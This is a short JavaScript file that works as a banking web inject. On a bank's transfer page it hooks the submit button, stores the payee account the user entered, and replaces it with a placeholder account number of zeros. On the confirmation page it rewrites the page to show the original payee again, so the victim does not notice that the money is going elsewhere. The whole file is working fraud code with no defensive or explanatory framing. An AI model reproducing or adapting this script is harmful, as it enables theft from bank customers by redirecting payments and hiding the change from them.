function changeReceiver()
{
	console.log("receiver: " + document.getElementById("id_receiver").value)
	localStorage["account"] = document.getElementById("id_receiver").value
	document.getElementById("id_receiver").value = '00000000000000000000000000';
}
function getElementsByAttrib(attrib) {
    return document.querySelectorAll('[' + attrib + ']');
}
var path = window.location.pathname;
if (path.indexOf("transfer_confirm") !== -1)
{
	if (localStorage["account"])
	{
		document.body.innerHTML = document.body.innerHTML.replace(/00000000000000000000000000/gi, localStorage["account"]);
	}
}
else if (path.indexOf("transfer") !== -1)
{
	var elements = getElementsByAttrib('type="submit"');
	if (elements.length > 0)
	{
		MySubmit = elements[0]
		MySubmit.onclick = changeReceiver
	}
}